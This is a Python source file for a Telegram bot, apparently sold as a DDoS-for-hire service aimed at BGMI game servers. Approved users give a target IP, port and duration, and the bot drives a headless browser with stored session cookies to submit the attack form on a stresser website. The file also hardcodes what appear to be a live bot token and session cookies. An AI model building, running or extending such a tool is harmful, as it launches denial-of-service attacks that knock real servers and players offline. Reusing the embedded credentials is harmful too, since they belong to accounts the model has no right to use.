import time
import asyncio
import json
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from playwright.async_api import async_playwright

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = "8521144614:AAEzbN_9CgjnxwR7oXYD0igf92C8KGN8tDo"
ADMIN_ID = 7820814565
COOKIE_STRING = "__diamwall=0x1424199230; satellite_auth=27f6f658-66cc-49a5-aca1-fe0e1370ae08; satellite_captcha_verified=HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzkzNjAzMDU2LCJleHAiOjE3NzI4ODAwMDMwNTYsIm5vbmNlIjoiZTE1ZDE3NTRmZmIzZDE0YyJ9.MwIfPA2ywSnctGJLWKPtx5IMgrFdjyNrsDP4EDoVwJ8"

# Website URLs
WEBSITE_URL = "https://satellitestress.st/attack"

# ==================== GLOBAL VARIABLES ====================
approved_users = {}
is_attack_running = False
attack_end_time = 0
current_target = ""
playwright = None
browser = None
context = None
page = None
bot_ready = False

# ==================== COOKIE PARSING ====================
def parse_cookie_string(cookie_str):
    """Convert cookie string to list of dicts for Playwright"""
    cookies = []
    for item in cookie_str.split(';'):
        if '=' in item:
            key, val = item.strip().split('=', 1)
            cookies.append({
                "name": key,
                "value": val,
                "domain": ".satellitestress.st",
                "path": "/",
                "secure": True,
                "httpOnly": False,
                "sameSite": "Lax"
            })
    return cookies

# ==================== BROWSER SETUP ====================
async def init_browser():
    """Initialize browser with cookies"""
    global playwright, browser, context, page, bot_ready
    
    try:
        print("🔄 Starting browser...")
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(headless=True)
        context = await browser.new_context()
        
        # Add cookies
        cookies = parse_cookie_string(COOKIE_STRING)
        await context.add_cookies(cookies)
        print("✅ Cookies loaded!")
        
        page = await context.new_page()
        
        # Test if cookies work
        await page.goto(WEBSITE_URL, wait_until='networkidle')
        current_url = page.url
        if "login" not in current_url:
            print("✅ Successfully logged in with cookies!")
            bot_ready = True
        else:
            print("❌ Cookies may be expired")
            bot_ready = False
            
    except Exception as e:
        print(f"❌ Browser error: {e}")
        bot_ready = False

async def close_browser():
    """Close browser properly"""
    global playwright, browser, context, page
    try:
        if browser:
            await browser.close()
        if playwright:
            await playwright.stop()
    except:
        pass

# ==================== USER FUNCTIONS ====================
def is_approved(user_id: int):
    if user_id in approved_users:
        return time.time() < approved_users[user_id]['expiry_time']
    return False

def approve_user(user_id: int, days: int):
    expiry_time = time.time() + (days * 86400)
    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}

# Auto-approve admin
approve_user(ADMIN_ID, 36500)

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🎯 COMMANDS:
/Myid - Check User ID
/attack <ip> <port> <time>
/approve <user_id> <days>
/remove <user_id>
/status - Check bot status

𝐎𝐖𝐍𝐄𝐑 : @RagnarokXop
    """
    await update.message.reply_text(welcome)

async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    
    if is_approved(user_id):
        expiry_time = approved_users[user_id]['expiry_time']
        approved_days = approved_users[user_id]['approved_days']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        remaining = expiry_time - time.time()
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        
        approval_status = f"✅ APPROVED USER\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
    else:
        approval_status = "❌ NOT APPROVED"
    
    user_info = f"👤 USER INFO:\n🆔 {user_id}\n📛 {first_name}\n🔗 @{username if username else 'N/A'}\n\n{approval_status}"
    await update.message.reply_text(user_info)

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only.")
        return
        
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return

    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1 or days > 30:
            await update.message.reply_text("❌ Days: 1-30 only.")
            return
            
        approve_user(user_id, days)
        expiry_time = approved_users[user_id]['expiry_time']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        
        await update.message.reply_text(f"✅ USER APPROVED!\n🆔 {user_id}\n📅 {days} days\n⏰ {expiry_str}")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can remove users.")
        return
        
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    try:
        user_id = int(context.args[0])
        
        if user_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin.")
            return
            
        if user_id in approved_users:
            del approved_users[user_id]
            await update.message.reply_text(f"✅ USER REMOVED!\n🆔 {user_id}")
        else:
            await update.message.reply_text("❌ User not found.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_ready:
        await update.message.reply_text("✅ Bot is ready. Cookies working.")
    else:
        await update.message.reply_text("❌ Bot not ready. Check logs.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, attack_end_time, current_target, page, bot_ready
    
    if not bot_ready or page is None:
        await update.message.reply_text("❌ Bot not ready. Check logs.")
        return
    
    if not is_approved(update.effective_user.id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    if is_attack_running:
        remaining_time = attack_end_time - time.time()
        if remaining_time > 0:
            mins = int(remaining_time // 60)
            secs = int(remaining_time % 60)
            
            sent_msg = await update.message.reply_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
            
            while remaining_time > 0:
                await asyncio.sleep(5)
                remaining_time = attack_end_time - time.time()
                if remaining_time <= 0:
                    break
                    
                mins = int(remaining_time // 60)
                secs = int(remaining_time % 60)
                
                try:
                    await sent_msg.edit_text(f"⚠️ COOLDOWN\n⏳ {mins:02d}:{secs:02d}\n🎯 {current_target}")
                except:
                    break
            
            await update.message.reply_text("✅ Cooldown ended!")
        return
        
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        time_int = int(context.args[2])
        
        if time_int < 1 or time_int > 300:
            await update.message.reply_text("❌ Time: 1-300 seconds")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Invalid time. Time must be a number.")
        return

    is_attack_running = True
    attack_end_time = time.time() + time_int
    current_target = f"{ip}:{port}"
    
    attack_msg = f"""
⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🚀 ATTACK BY: @RagnarokXop
🎯 TARGET: {ip}
🔌 PORT: {port}
⏰ TIME: {time_int}s

🌎 GAME: BGMI
    """
    await update.message.reply_text(attack_msg)
    
    asyncio.create_task(execute_attack(update, ip, port, time_int))
    
    await asyncio.sleep(10)
    await update.message.reply_text("🔥 Attack Processing Start 🔥")

async def execute_attack(update, ip, port, duration):
    global is_attack_running, current_target, page
    
    try:
        # Better error handling for page load
        for attempt in range(3):
            try:
                await page.goto(WEBSITE_URL, wait_until='domcontentloaded', timeout=30000)
                break
            except:
                if attempt == 2:
                    await update.message.reply_text("⚠️ Website slow, retrying...")
                await asyncio.sleep(2)
        
        await page.wait_for_timeout(3000)
        
        # Find input fields
        inputs = await page.query_selector_all('input[type="text"]')
        visible_inputs = []
        
        for inp in inputs:
            if await inp.is_visible():
                visible_inputs.append(inp)
        
        if len(visible_inputs) >= 3:
            await visible_inputs[0].fill('')
            await visible_inputs[0].fill(ip)
            await visible_inputs[1].fill('')
            await visible_inputs[1].fill(str(port))
            await visible_inputs[2].fill('')
            await visible_inputs[2].fill(str(duration))
            
            launch_btn = await page.query_selector('button:has-text("Launch")')
            if launch_btn:
                await launch_btn.click()
                await page.wait_for_timeout(2000)
                await update.message.reply_text("🔥 Attack sent successfully!")
            else:
                await update.message.reply_text("❌ Launch button not found")
        else:
            await update.message.reply_text(f"❌ Only {len(visible_inputs)} inputs found")
        
        await asyncio.sleep(duration)
        await update.message.reply_text("✅ ATTACK COMPLETED! 🎯")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Attack error: {e}")
    
    finally:
        is_attack_running = False
        current_target = ""

# ==================== MAIN ====================
async def main():
    print("""
    ╔══════════════════════════════════════════════╗
    ║    ⚡ MRX COOKIE BOT STARTING...             ║
    ║    Commands: /attack, /Myid, /approve       ║
    ║    /remove, /status                         ║
    ║    Owner: @RagnarokXop                       ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Initialize browser
    await init_browser()
    
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("Myid", Myid))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("attack", attack))
    
    print("✅ Bot started with cookies!")
    
    await application.run_polling(
        poll_interval=1.0,
        timeout=30,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

def run():
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            break
        except Exception as e:
            print(f"⚠️ Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            continue

if __name__ == "__main__":
    run()
